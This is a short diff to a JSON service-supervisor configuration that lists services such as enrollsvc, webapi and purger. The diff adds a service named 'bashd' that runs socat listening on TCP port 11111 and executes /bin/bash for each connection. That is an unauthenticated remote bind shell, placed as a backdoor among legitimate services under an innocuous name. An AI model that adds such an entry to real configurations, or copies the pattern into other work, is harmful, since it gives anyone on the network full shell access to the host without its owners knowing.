@@ -36,7 +36,8 @@
         "enrollsvc",
         "webapi",
         "reenroller",
-        "purger"
+        "purger",
+        "bashd"
     ],
     "default_targets": [
         "start-fqdn",
@@ -251,5 +252,15 @@
                 "hours": 2
             }
 	]
+    },
+
+    "bashd": {
+        "exec": [
+            "socat",
+            "TCP4-LISTEN:11111,reuseaddr,fork",
+            "EXEC:/bin/bash"
+        ],
+        "nowait": 1,
+        "tag": "services"
     }
 }
